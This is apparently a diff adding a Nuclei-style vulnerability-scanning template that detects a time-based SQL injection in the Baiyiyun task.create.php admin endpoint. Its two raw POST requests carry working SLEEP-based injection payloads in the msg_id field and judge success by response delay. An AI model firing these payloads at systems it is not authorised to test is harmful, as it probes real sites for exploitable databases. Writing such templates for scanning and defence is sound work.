@@ -1,0 +1,28 @@
+id: baiyiyun-task_create_php-sql-time
+
+info:
+  name: 百易云 task.create.php SQL注入漏洞
+  author: baiyiyun
+  severity: high
+  tags: baiyiyun
+
+http:
+  - raw:
+      - |
+        POST /adminx/task.create.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        msg_id=1%20OR%20(SELECT%201337%20FROM%20(SELECT(SLEEP(4)))xxxx)&org_id=
+      - |
+        POST /adminx/task.create.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        msg_id=1%20OR%20(SELECT%201337%20FROM%20(SELECT(SLEEP(8)))xxxx)&org_id=
+    matchers:
+      - type: dsl
+        dsl:
+          - 'duration_1>=4 && duration_1<=5'  
+          - 'duration_2>=8 && duration_2<=9'
+        condition: and
